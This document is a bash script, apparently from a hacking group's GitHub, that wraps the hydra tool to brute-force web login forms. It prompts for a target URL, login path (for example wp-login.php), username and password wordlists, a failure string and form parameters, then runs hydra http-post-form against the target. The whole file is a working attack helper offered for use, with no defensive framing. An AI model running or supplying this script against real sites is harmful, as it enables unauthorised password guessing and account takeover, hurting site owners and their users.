#!/bin/bash
echo "
 * * * * * *  * * * * *
* Hydra Form Post Data * Code By Cy#b3r00T
*  Brute Helper Tools  * http://github.com/soracyberteam/
 * * * * * *  * * * * *
 Note : Install hydra dulu sebelum pakai tools ini :)
 ";
read -p "Url (ex:target.com) : http://" url;
read -p "Path (ex:/wp-login.php) : " path;
read -p "User (ex:admin or /path/wordlist.txt) : " user;
read -p "Pass (ex:12345 or /path/wordlist.txt) : " pass;
read -p "Bad Login (ex:wrong) : " bad;
read -p "Parameter (ex:username=^USER^&password=^PASS^) : " parameter;
sleep 1;
echo "[+] Execute : http://$url/$path";
sleep 0.5;
echo "[+] User : $user";
sleep 0.5;
echo "[+] Pass : $pass";
sleep 0.5;
echo "[+] Bad Login : $bad";
sleep 0.5;
echo "[+] Parameter : $parameter";
sleep 0.5;
echo "[+] Command : hydra -I $url http-post-form '$path:$parameter:$bad' -l '$user' -P '$pass'";
hydra -I $url http-post-form "$path:$parameter:$bad" -l "$user" -P "$pass"
